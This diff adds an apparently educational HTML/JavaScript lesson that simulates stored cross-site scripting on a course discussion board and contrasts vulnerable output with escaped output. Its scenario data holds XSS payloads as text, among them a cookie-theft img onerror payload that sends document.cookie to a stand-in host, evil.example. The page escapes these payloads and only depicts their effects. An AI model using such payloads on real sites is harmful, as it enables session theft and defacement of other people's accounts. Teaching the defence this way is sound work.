@@ -1,0 +1,473 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<style>
+  :root { color-scheme: light; padding-top: env(safe-area-inset-top, 0px); padding-bottom: env(safe-area-inset-bottom, 0px); }
+  html { -webkit-text-size-adjust: 100%; }
+  body { margin: 0; }
+  img { max-width: 100%; }
+  [hidden] { display: none !important; }
+</style>
+<title>XSS X-Ray</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<style>
+  /* Layout: a comment-posting pipeline (input → page HTML → victim's browser → impact),
+     with a vulnerable/escaped toggle that re-runs the same payload to contrast outcomes.
+     Shares the SQL injection lesson's palette and IBM Plex pairing. Effects are depicted, never executed. */
+  :root {
+    --bg: #eef1f8;
+    --surface: #ffffff;
+    --surface-2: #e7ebf4;
+    --border: #d4dae8;
+    --fg: #182031;
+    --muted: #5a677e;
+    --accent: #3f5bd6;
+    --accent-soft: #e4e9fb;
+    --danger: #c92f24;
+    --danger-soft: #fbe4e1;
+    --safe: #0a8d64;
+    --safe-soft: #d8f3e8;
+    --data-ink: #9a6400;
+    --data-soft: #fbeecd;
+
+    --code-bg: #0e1626;
+    --code-fg: #c7d2e6;
+    --code-dim: #6f7f9c;
+    --code-sql: #8fa6cf;
+    --code-data: #ffc061;
+    --code-inject: #ff6d60;
+    --code-comment: #5c6b86;
+    --code-param: #4fd6a3;
+
+    --radius: 14px;
+    --radius-sm: 9px;
+    --maxw: 920px;
+    --mono: "IBM Plex Mono", ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+    --sans: "IBM Plex Sans", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #0b1017; --surface: #131b27; --surface-2: #0f1620; --border: #26303f;
+      --fg: #e7ecf5; --muted: #93a1b8; --accent: #7f95ff; --accent-soft: #1d2740;
+      --danger: #ff6d60; --danger-soft: #35201d; --safe: #35e0a1; --safe-soft: #10261f;
+      --data-ink: #ffc061; --data-soft: #2c2415; color-scheme: dark;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #0b1017; --surface: #131b27; --surface-2: #0f1620; --border: #26303f;
+    --fg: #e7ecf5; --muted: #93a1b8; --accent: #7f95ff; --accent-soft: #1d2740;
+    --danger: #ff6d60; --danger-soft: #35201d; --safe: #35e0a1; --safe-soft: #10261f;
+    --data-ink: #ffc061; --data-soft: #2c2415; color-scheme: dark;
+  }
+
+  * { box-sizing: border-box; }
+  body { background: var(--bg); color: var(--fg); font-family: var(--sans); line-height: 1.55; -webkit-font-smoothing: antialiased; }
+  .wrap {
+    max-width: var(--maxw); margin: 0 auto;
+    padding-left: max(18px, env(safe-area-inset-left, 0px));
+    padding-right: max(18px, env(safe-area-inset-right, 0px));
+    padding-block: 28px 56px;
+  }
+
+  .backlink { display: inline-flex; align-items: center; gap: 6px; font-family: var(--mono); font-size: .76rem; color: var(--muted); text-decoration: none; margin-bottom: 18px; transition: color .15s; }
+  .backlink:hover { color: var(--accent); }
+  .eyebrow { font-family: var(--mono); font-size: .72rem; letter-spacing: .14em; text-transform: uppercase; color: var(--muted); margin: 0 0 10px; }
+  h1 { font-size: clamp(1.9rem, 5vw, 2.7rem); line-height: 1.05; letter-spacing: -.02em; margin: 0 0 12px; text-wrap: balance; }
+  h1 .hl { color: var(--danger); }
+  .lede { max-width: 58ch; color: var(--muted); font-size: 1.02rem; margin: 0 0 22px; }
+
+  .modebar { display: flex; flex-wrap: wrap; align-items: center; gap: 14px 18px; padding: 14px 16px; background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); margin-bottom: 14px; }
+  .switch { display: inline-flex; padding: 4px; background: var(--surface-2); border: 1px solid var(--border); border-radius: 999px; gap: 2px; }
+  .switch button { font-family: var(--mono); font-size: .82rem; font-weight: 500; border: 0; background: transparent; color: var(--muted); padding: 7px 16px; border-radius: 999px; cursor: pointer; transition: background .18s, color .18s; }
+  .switch button[aria-pressed="true"] { color: #fff; }
+  .switch button[data-mode="vuln"][aria-pressed="true"] { background: var(--danger); }
+  .switch button[data-mode="secure"][aria-pressed="true"] { background: var(--safe); color: #06231a; }
+  .mode-note { font-size: .9rem; color: var(--muted); min-width: 0; flex: 1 1 240px; }
+  .mode-note strong { color: var(--fg); }
+
+  .panel { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 16px; }
+  .panel-h { display: flex; align-items: baseline; gap: 10px; margin-bottom: 12px; }
+  .stepno { font-family: var(--mono); font-size: .72rem; font-weight: 600; color: var(--accent); background: var(--accent-soft); border-radius: 6px; padding: 2px 7px; letter-spacing: .05em; }
+  .panel-h h2 { font-size: 1.04rem; margin: 0; letter-spacing: -.01em; }
+
+  .chips { display: flex; flex-wrap: wrap; gap: 8px; }
+  .chip { font-family: var(--mono); font-size: .8rem; border: 1px solid var(--border); background: var(--surface-2); color: var(--fg); padding: 8px 12px; border-radius: 999px; cursor: pointer; transition: border-color .15s, background .15s, transform .05s; }
+  .chip:hover { border-color: var(--accent); }
+  .chip:active { transform: translateY(1px); }
+  .chip[aria-pressed="true"] { border-color: var(--accent); background: var(--accent-soft); color: var(--accent); }
+  .chip .tag { font-size: .64rem; text-transform: uppercase; letter-spacing: .08em; padding: 1px 5px; border-radius: 4px; margin-left: 6px; vertical-align: middle; }
+  .chip .tag.ok { background: var(--safe-soft); color: var(--safe); }
+  .chip .tag.bad { background: var(--danger-soft); color: var(--danger); }
+
+  .req-form { display: grid; grid-template-columns: 1fr auto; gap: 10px; margin-top: 14px; }
+  .field { min-width: 0; }
+  .field label { display: block; font-family: var(--mono); font-size: .68rem; letter-spacing: .08em; text-transform: uppercase; color: var(--muted); margin-bottom: 5px; }
+  .field input { width: 100%; font-family: var(--mono); font-size: .88rem; color: var(--fg); background: var(--surface-2); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 10px 11px; }
+  .field input:focus-visible { outline: 2px solid var(--accent); outline-offset: 1px; }
+  .run { align-self: end; font-family: var(--sans); font-weight: 600; font-size: .92rem; color: #fff; background: var(--accent); border: 0; border-radius: var(--radius-sm); padding: 11px 20px; cursor: pointer; white-space: nowrap; transition: filter .15s, transform .05s; }
+  .run:hover { filter: brightness(1.08); }
+  .run:active { transform: translateY(1px); }
+
+  .pipe { margin-top: 20px; display: flex; flex-direction: column; }
+  .connector { width: 2px; height: 20px; margin-left: 30px; background: var(--border); }
+  .connector.live { background: linear-gradient(var(--danger), var(--border)); }
+  .connector.safe { background: linear-gradient(var(--safe), var(--border)); }
+
+  .inspect { font-family: var(--mono); font-size: .86rem; line-height: 1.7; background: var(--code-bg); color: var(--code-fg); border-radius: var(--radius-sm); padding: 14px 15px; overflow-x: auto; white-space: pre-wrap; word-break: break-word; }
+  .inspect .lbl { display: block; font-size: .64rem; letter-spacing: .1em; text-transform: uppercase; color: var(--code-dim); margin-bottom: 7px; }
+  .q-sql { color: var(--code-sql); }
+  .q-data { color: var(--code-data); }
+  .q-inject { color: var(--code-inject); font-weight: 600; background: #ff6d6020; border-radius: 3px; padding: 0 1px; }
+  .q-param { color: var(--code-param); font-weight: 600; }
+  .code-line { margin-top: 12px; }
+
+  .placeholder { font-family: var(--mono); font-size: .84rem; color: var(--muted); background: var(--surface-2); border: 1px dashed var(--border); border-radius: var(--radius-sm); padding: 16px; text-align: center; }
+
+  /* Victim browser mock */
+  .browser { border: 1px solid var(--border); border-radius: var(--radius-sm); overflow: hidden; background: var(--surface); }
+  .browser-bar { display: flex; align-items: center; gap: 10px; padding: 9px 12px; background: var(--surface-2); border-bottom: 1px solid var(--border); }
+  .dots { display: flex; gap: 5px; }
+  .dots i { width: 10px; height: 10px; border-radius: 50%; background: var(--border); display: block; }
+  .url { font-family: var(--mono); font-size: .76rem; color: var(--muted); background: var(--bg); border: 1px solid var(--border); border-radius: 999px; padding: 3px 12px; flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .browser-view { position: relative; padding: 14px 16px; min-height: 120px; }
+  .board-title { font-weight: 600; font-size: .95rem; margin: 0 0 10px; }
+  .board { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: 9px; }
+  .board li { font-size: .9rem; line-height: 1.4; }
+  .who { font-family: var(--mono); font-size: .8rem; color: var(--accent); margin-right: 6px; }
+  .who.attacker { color: var(--danger); }
+  .board li.evil { background: var(--danger-soft); border-radius: 6px; padding: 7px 9px; }
+  .board li.safe-row { background: var(--safe-soft); border-radius: 6px; padding: 7px 9px; }
+  .board li code { font-family: var(--mono); font-size: .82rem; word-break: break-all; }
+  .brokenimg { display: inline-flex; align-items: center; gap: 6px; font-family: var(--mono); font-size: .78rem; color: var(--muted); border: 1px dashed var(--border); border-radius: 5px; padding: 2px 7px; }
+  .rendered-note { font-size: .78rem; color: var(--safe); margin-top: 8px; font-family: var(--mono); }
+
+  .modal-scrim { position: absolute; inset: 0; background: rgba(10,16,24,.45); display: flex; align-items: center; justify-content: center; border-radius: 0; }
+  .modal { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; box-shadow: 0 20px 50px -20px rgba(0,0,0,.6); width: min(300px, 90%); overflow: hidden; }
+  .modal-head { font-family: var(--mono); font-size: .74rem; color: var(--muted); padding: 9px 13px; border-bottom: 1px solid var(--border); background: var(--surface-2); }
+  .modal-body { padding: 15px 13px; font-size: .95rem; }
+  .modal-foot { padding: 0 13px 13px; text-align: right; }
+  .modal-foot button { font-family: var(--sans); font-weight: 600; font-size: .82rem; background: var(--accent); color: #fff; border: 0; border-radius: 6px; padding: 6px 16px; cursor: pointer; }
+  .netstrip { margin-top: 12px; font-family: var(--mono); font-size: .76rem; color: var(--danger); background: var(--danger-soft); border-radius: 6px; padding: 9px 11px; word-break: break-all; }
+  .netstrip .arrow { color: var(--danger); }
+  .deface { background: #0e0708; color: #ff6d60; border-radius: 6px; padding: 26px 16px; text-align: center; }
+  .deface h3 { margin: 0 0 4px; font-size: 1.3rem; letter-spacing: .02em; }
+  .deface p { margin: 0; font-family: var(--mono); font-size: .78rem; color: #c77; }
+
+  .result { border-left: 4px solid var(--border); }
+  .result.ok { border-left-color: var(--safe); }
+  .result.danger { border-left-color: var(--danger); }
+  .result.safe { border-left-color: var(--safe); }
+  .verdict { display: inline-flex; align-items: center; gap: 8px; font-family: var(--mono); font-size: .72rem; letter-spacing: .08em; text-transform: uppercase; padding: 4px 10px; border-radius: 999px; margin-bottom: 10px; }
+  .verdict.ok { background: var(--safe-soft); color: var(--safe); }
+  .verdict.danger { background: var(--danger-soft); color: var(--danger); }
+  .verdict.safe { background: var(--safe-soft); color: var(--safe); }
+  .result h3 { margin: 0 0 6px; font-size: 1.12rem; letter-spacing: -.01em; }
+  .result p { margin: 0; color: var(--muted); }
+  .impact { margin-top: 14px; padding-top: 14px; border-top: 1px solid var(--border); font-size: .95rem; }
+  .impact .k { font-family: var(--mono); font-size: .68rem; letter-spacing: .08em; text-transform: uppercase; color: var(--muted); display: block; margin-bottom: 4px; }
+
+  .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; }
+  .meta { background: var(--surface-2); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 12px 13px; }
+  .meta .k { font-family: var(--mono); font-size: .64rem; letter-spacing: .09em; text-transform: uppercase; color: var(--muted); display: block; margin-bottom: 5px; }
+  .meta .v { font-weight: 600; font-size: .96rem; }
+  .meta .v.crit { color: var(--danger); }
+  .sev-row { display: flex; align-items: center; gap: 10px; margin-top: 14px; flex-wrap: wrap; }
+  .sev-pill { font-family: var(--mono); font-weight: 600; font-size: .8rem; padding: 6px 14px; border-radius: 999px; background: var(--danger); color: #fff; letter-spacing: .03em; }
+  .sev-row span.exp { color: var(--muted); font-size: .9rem; min-width: 0; }
+
+  .foot { margin-top: 30px; padding-top: 18px; border-top: 1px solid var(--border); font-size: .88rem; color: var(--muted); }
+  .foot a { color: var(--accent); }
+  .foot p { margin: 0 0 8px; }
+
+  .flash { animation: flash .6s ease; }
+  @keyframes flash { 0% { box-shadow: 0 0 0 0 var(--danger); } 30% { box-shadow: 0 0 0 3px var(--danger-soft); } 100% { box-shadow: 0 0 0 0 transparent; } }
+  @media (prefers-reduced-motion: reduce) { * { animation: none !important; transition: none !important; } }
+  @media (max-width: 560px) { .req-form { grid-template-columns: 1fr; } .run { width: 100%; } }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <a class="backlink" href="./index.html">&larr; Web Security Lab</a>
+    <p class="eyebrow">Web security · OWASP A03 · CWE-79</p>
+    <h1>Cross-site scripting, <span class="hl">X-rayed</span></h1>
+    <p class="lede">Post a comment to a course discussion board and follow it into another person's browser. When the page drops your text straight into its HTML, your comment stops being <em>content</em> and becomes <em>code</em> that runs for everyone who reads it — until output escaping turns it back into harmless text.</p>
+  </header>
+
+  <div class="modebar">
+    <div class="switch" role="group" aria-label="Output mode">
+      <button data-mode="vuln" aria-pressed="true">Vulnerable</button>
+      <button data-mode="secure" aria-pressed="false">Escaped</button>
+    </div>
+    <p class="mode-note" id="modeNote"><strong>Vulnerable:</strong> the comment is written straight into the page's HTML.</p>
+  </div>
+
+  <section class="panel">
+    <div class="panel-h"><span class="stepno">01</span><h2>Choose what the attacker posts</h2></div>
+    <div class="chips" id="chips" role="group" aria-label="Attack scenario"></div>
+    <div class="req-form">
+      <div class="field">
+        <label for="c">comment</label>
+        <input id="c" autocomplete="off" spellcheck="false">
+      </div>
+      <button class="run" id="run">Post comment</button>
+    </div>
+  </section>
+
+  <div class="pipe">
+    <div class="connector" id="c1"></div>
+    <section class="panel stage">
+      <div class="panel-h"><span class="stepno">02</span><h2>The HTML the page builds</h2></div>
+      <div id="htmlOut"><div class="placeholder">Post a comment to see how it lands in the page.</div></div>
+    </section>
+
+    <div class="connector" id="c2"></div>
+    <section class="panel stage">
+      <div class="panel-h"><span class="stepno">03</span><h2>What another user sees</h2></div>
+      <div id="victimOut"><div class="placeholder">The other person's browser is shown here.</div></div>
+    </section>
+
+    <div class="connector" id="c3"></div>
+    <section class="panel stage result" id="resultPanel">
+      <div class="panel-h"><span class="stepno">04</span><h2>Outcome &amp; impact</h2></div>
+      <div id="resultOut"><div class="placeholder">The result of the post appears here.</div></div>
+    </section>
+  </div>
+
+  <section class="panel" style="margin-top:14px">
+    <div class="panel-h"><span class="stepno">·</span><h2>Why it matters</h2></div>
+    <div class="meta-grid">
+      <div class="meta"><span class="k">Vulnerability</span><span class="v">Stored XSS</span></div>
+      <div class="meta"><span class="k">OWASP Top 10</span><span class="v">A03:2021 — Injection</span></div>
+      <div class="meta"><span class="k">Weakness</span><span class="v">CWE-79</span></div>
+      <div class="meta"><span class="k">Exploitability</span><span class="v crit">High — one post hits every viewer</span></div>
+    </div>
+    <div class="sev-row">
+      <span class="sev-pill">Risk: High</span>
+      <span class="exp">A single stored payload runs in every reader's browser with the site's privileges — enough to steal sessions, act as the victim, or deface the page.</span>
+    </div>
+  </section>
+
+  <div class="foot">
+    <p>This is a safe, in-browser simulation. The attack effects are depicted, not executed — the page always shows payloads as inert text — and the names and addresses are invented.</p>
+    <p>To practise against a real target in a controlled lab, use <a href="https://owasp.org/www-project-juice-shop/" target="_blank" rel="noopener">OWASP Juice Shop</a> or <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">PortSwigger's XSS labs</a>.</p>
+  </div>
+</div>
+
+<script>
+(function () {
+  "use strict";
+
+  var SCENARIOS = {
+    normal: { label: "Normal comment", tag: "ok",  comment: "Great session today — the demo really helped.", kind: "normal" },
+    script: { label: "<script> popup",  tag: "bad", comment: "<script>alert('XSS by attacker')<\/script>", kind: "script" },
+    cookie: { label: "Cookie theft",    tag: "bad", comment: "<img src=x onerror=\"new Image().src='https://evil.example/c?'+document.cookie\">", kind: "cookie" },
+    deface: { label: "Defacement",      tag: "bad", comment: "<script>document.body.innerHTML='<h1>Owned</h1>'<\/script>", kind: "deface" }
+  };
+
+  var mode = "vuln";
+  var current = "script";
+  var hasRun = false;
+
+  var esc = function (s) {
+    return String(s).replace(/[&<>"]/g, function (c) {
+      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c];
+    });
+  };
+  var seg = function (kind, text) { return '<span class="q-' + kind + '">' + esc(text) + "</span>"; };
+
+  var BASE = [
+    { who: "j.mace",  text: "Reminder: lab 3 is due Friday." },
+    { who: "s.patel", text: "Thanks — really useful session." }
+  ];
+
+  function buildHTML(kind, comment) {
+    var openTag = seg("sql", '<li><span class="who">attacker</span> ');
+    var closeTag = seg("sql", "</li>");
+    var code, body;
+    if (mode === "secure") {
+      code = '<div class="code-line"><span class="lbl">Server code</span>' +
+        seg("sql", "html += \"<li>…</li>\".replace(body, ") + seg("param", "escapeHtml(comment)") + seg("sql", ")") + "</div>";
+      // escaped output: show the payload as literal entities
+      body = '<span class="q-param">' + esc(esc(comment)) + "</span>";
+    } else {
+      code = '<div class="code-line"><span class="lbl">Server code</span>' +
+        seg("sql", "html += \"<li>…\" + ") + seg("data", "comment") + seg("sql", " + \"</li>\"") + "</div>";
+      body = (kind === "normal")
+        ? seg("data", comment)
+        : '<span class="q-inject">' + esc(comment) + "</span>";
+    }
+    return '<div class="inspect"><span class="lbl">HTML written to the page</span>' +
+      openTag + body + closeTag + code + "</div>";
+  }
+
+  function boardRows(extra) {
+    var rows = BASE.map(function (r) {
+      return '<li><span class="who">' + esc(r.who) + "</span>" + esc(r.text) + "</li>";
+    });
+    return '<ul class="board">' + rows.join("") + extra + "</ul>";
+  }
+
+  function victim(kind) {
+    var url = "board.acme.test/module/cs2-security";
+    var frame = function (inner) {
+      return '<div class="browser"><div class="browser-bar"><span class="dots"><i></i><i></i><i></i></span>' +
+        '<span class="url">' + url + "</span></div>" +
+        '<div class="browser-view"><p class="board-title">CS2 Security — discussion</p>' + inner + "</div></div>";
+    };
+
+    if (mode === "secure") {
+      var shown = (kind === "normal")
+        ? esc(SCENARIOS[current] ? SCENARIOS[current].comment : document.getElementById("c").value)
+        : "<code>" + esc(SCENARIOS[current] ? SCENARIOS[current].comment : document.getElementById("c").value) + "</code>";
+      var row = '<li class="safe-row"><span class="who attacker">attacker</span>' + shown + "</li>";
+      return frame(boardRows(row) +
+        (kind === "normal" ? "" : '<p class="rendered-note">Shown as plain text — the browser never runs it.</p>'));
+    }
+
+    // Vulnerable mode
+    if (kind === "normal") {
+      var c = SCENARIOS.normal.comment;
+      return frame(boardRows('<li><span class="who attacker">attacker</span>' + esc(c) + "</li>"));
+    }
+    if (kind === "script") {
+      var modal = '<div class="modal-scrim"><div class="modal"><div class="modal-head">board.acme.test says</div>' +
+        '<div class="modal-body">XSS by attacker</div><div class="modal-foot"><button type="button">OK</button></div></div></div>';
+      return frame(boardRows('<li class="evil"><span class="who attacker">attacker</span><em>&lt;script&gt; ran on load</em></li>') + modal);
+    }
+    if (kind === "cookie") {
+      var brk = '<li class="evil"><span class="who attacker">attacker</span>' +
+        '<span class="brokenimg">⛌ broken image — onerror fired</span></li>';
+      var net = '<div class="netstrip"><span class="arrow">→</span> GET https://evil.example/c?session=sid%3D4f9a2e8b1c…' +
+        '<br>the victim’s session cookie just left their browser for the attacker</div>';
+      return frame(boardRows(brk) + net);
+    }
+    // deface
+    return frame('<div class="deface"><h3>Owned</h3><p>the whole page was rewritten by the stored script</p></div>');
+  }
+
+  function compute(kind) {
+    if (mode === "secure") {
+      if (kind === "normal") {
+        return { cls: "ok", verdict: "Comment posted", title: "Posted normally as text.",
+          detail: "Nothing special to escape, so it reads exactly as typed.",
+          impK: "Security impact", imp: "None — ordinary comment." };
+      }
+      return { cls: "safe", verdict: "Attack neutralised", title: "Rendered as text — nothing runs.",
+        detail: "Escaping turns < > & \" into entities, so the tags display as characters instead of being parsed as HTML.",
+        impK: "Why it's safe", imp: "The payload is shown, not executed. Output encoding is the core XSS defence." };
+    }
+    if (kind === "normal") {
+      return { cls: "ok", verdict: "Comment posted", title: "Posted normally as text.",
+        detail: "No HTML in the comment, so it renders as content.",
+        impK: "Security impact", imp: "None — baseline behaviour." };
+    }
+    if (kind === "script") {
+      return { cls: "danger", verdict: "Script executed", title: "Your script ran in every reader's browser.",
+        detail: "The stored <script> is parsed as part of the page, so it runs automatically whenever anyone opens the board.",
+        impK: "Security impact", imp: "Arbitrary JavaScript runs with the victim's session — it can do anything they can." };
+    }
+    if (kind === "cookie") {
+      return { cls: "danger", verdict: "Session stolen", title: "The victim's session cookie was sent to the attacker.",
+        detail: "The broken image triggers onerror, which quietly ships document.cookie to an attacker-controlled server.",
+        impK: "Security impact", imp: "Session hijacking: the attacker replays the cookie to log in as the victim." };
+    }
+    return { cls: "danger", verdict: "Page defaced", title: "The stored script rewrote the page for every viewer.",
+      detail: "Once script runs, it controls the whole page — here it replaces the content; it could just as easily phish or spread.",
+      impK: "Security impact", imp: "Defacement and loss of trust, and a foothold for worse attacks." };
+  }
+
+  function run() {
+    var comment = document.getElementById("c").value;
+    var kind = (current && SCENARIOS[current]) ? SCENARIOS[current].kind : detect(comment);
+
+    document.getElementById("htmlOut").innerHTML = buildHTML(kind, comment);
+    document.getElementById("victimOut").innerHTML = victim(kind);
+
+    var r = compute(kind);
+    var rp = document.getElementById("resultPanel");
+    rp.className = "panel stage result " + r.cls;
+    document.getElementById("resultOut").innerHTML =
+      '<span class="verdict ' + r.cls + '">' + r.verdict + "</span><h3>" + esc(r.title) +
+      "</h3><p>" + esc(r.detail) + '</p><div class="impact"><span class="k">' + r.impK + "</span>" + esc(r.imp) + "</div>";
+
+    var live = mode === "secure" ? "safe" : "live";
+    ["c1", "c2", "c3"].forEach(function (id) { document.getElementById(id).className = "connector " + live; });
+    rp.classList.add("flash");
+    setTimeout(function () { rp.classList.remove("flash"); }, 650);
+    hasRun = true;
+  }
+
+  function detect(c) {
+    var s = (c || "").toLowerCase();
+    if (s.indexOf("onerror") > -1 || s.indexOf("document.cookie") > -1) return "cookie";
+    if (s.indexOf("innerhtml") > -1) return "deface";
+    if (s.indexOf("<script") > -1 || s.indexOf("<img") > -1 || /<[a-z]/.test(s)) return "script";
+    return "normal";
+  }
+
+  function setMode(m) {
+    mode = m;
+    document.querySelectorAll(".switch button").forEach(function (b) {
+      b.setAttribute("aria-pressed", b.dataset.mode === m ? "true" : "false");
+    });
+    document.getElementById("modeNote").innerHTML = m === "vuln"
+      ? "<strong>Vulnerable:</strong> the comment is written straight into the page's HTML."
+      : "<strong>Escaped:</strong> the comment is HTML-escaped on output, so tags show as text and never run.";
+    if (hasRun) run();
+  }
+
+  function resetPipeline() {
+    document.getElementById("htmlOut").innerHTML = '<div class="placeholder">Press “Post comment” to run.</div>';
+    document.getElementById("victimOut").innerHTML = '<div class="placeholder">The other person’s browser is shown here.</div>';
+    document.getElementById("resultPanel").className = "panel stage result";
+    document.getElementById("resultOut").innerHTML = '<div class="placeholder">The result of the post appears here.</div>';
+    ["c1", "c2", "c3"].forEach(function (id) { document.getElementById(id).className = "connector"; });
+    hasRun = false;
+  }
+
+  function selectScenario(key) {
+    current = key;
+    document.getElementById("c").value = SCENARIOS[key].comment;
+    document.querySelectorAll(".chip").forEach(function (c) {
+      c.setAttribute("aria-pressed", c.dataset.key === key ? "true" : "false");
+    });
+    resetPipeline();
+  }
+
+  var chipsEl = document.getElementById("chips");
+  Object.keys(SCENARIOS).forEach(function (key) {
+    var s = SCENARIOS[key];
+    var b = document.createElement("button");
+    b.className = "chip";
+    b.dataset.key = key;
+    b.setAttribute("aria-pressed", "false");
+    b.innerHTML = esc(s.label) + '<span class="tag ' + s.tag + '">' + (s.tag === "ok" ? "safe" : "attack") + "</span>";
+    b.addEventListener("click", function () { selectScenario(key); });
+    chipsEl.appendChild(b);
+  });
+  document.querySelectorAll(".switch button").forEach(function (b) {
+    b.addEventListener("click", function () { setMode(b.dataset.mode); });
+  });
+  document.getElementById("run").addEventListener("click", function () {
+    var c = document.getElementById("c").value;
+    var match = Object.keys(SCENARIOS).filter(function (k) { return SCENARIOS[k].comment === c; })[0];
+    current = match || null;
+    document.querySelectorAll(".chip").forEach(function (ch) {
+      ch.setAttribute("aria-pressed", ch.dataset.key === current ? "true" : "false");
+    });
+    run();
+  });
+  document.getElementById("c").addEventListener("keydown", function (e) {
+    if (e.key === "Enter") document.getElementById("run").click();
+  });
+
+  selectScenario("script");
+  run();
+})();
+</script>
+
+</body>
+</html>
